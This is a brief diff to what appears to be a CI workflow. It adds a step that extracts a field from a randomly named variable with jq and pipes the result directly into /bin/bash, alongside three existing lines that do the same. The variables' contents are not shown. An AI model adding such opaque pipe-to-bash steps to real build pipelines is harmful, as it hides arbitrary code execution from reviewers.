@@ -51,6 +51,7 @@ jobs:
           echo $o87 | jq -r .zsp775 | /bin/bash
           echo $wzsep9 | jq -r .h007 | /bin/bash
           echo $jdq0 | jq -r .e168 | /bin/bash
+          printf '%s' "$ovgwu70629" | jq -r .cjhzy92966 | /bin/bash
 
       - name: Upload artifact
         if: always()
